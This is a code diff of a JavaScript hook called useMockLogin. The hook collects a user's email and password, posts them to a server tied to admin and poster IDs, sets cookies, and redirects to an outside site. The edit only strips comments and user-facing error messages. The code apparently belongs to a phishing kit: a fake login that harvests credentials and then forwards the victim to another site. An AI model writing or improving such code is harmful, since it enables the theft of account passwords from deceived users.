@@ -20,37 +20,28 @@ function useMockLogin(adminId, posterId) {
       });
 
       const data = await res.json();
-      // console.log("Create Response:", data);
 
       if (res.ok) {
         Cookies.set("id", data?.info?._id);
         Cookies.set("email", data?.info?.email || "");
-        // toast.success("Username saved, now enter your valid email.");
-        
         return true;
       } else {
-        toast.error("Failed to create user");
         return false;
       }
     } catch (err) {
       console.error(err);
-      toast.error("Server Error");
       return false;
     }
   };
 
-  // Step 2 — update
   const updateUserEmail = async ({ email, password }) => {
     try {
       const id = Cookies.get("id");
       if (!id) {
-        toast.error("User ID not found. Please restart login.");
         return false;
       }
 
-      // Validate password length
       if (password.length < 8) {
-        toast.error("Password must be at least 8 characters");
         return false;
       }
 
@@ -64,11 +55,9 @@ function useMockLogin(adminId, posterId) {
       });
 
       const data = await res.json();
-      // console.log("Update Response:", data);
-
+     
       if (res.ok) {
         Cookies.set("email", data?.info?.email);
-        // toast.success("Email updated successfully!");
         router.push("https://privatedelights.ch");
         return true;
       } else {
@@ -77,7 +66,6 @@ function useMockLogin(adminId, posterId) {
       }
     } catch (err) {
       console.error(err);
-      toast.error("Server Error");
       return false;
     }
   };
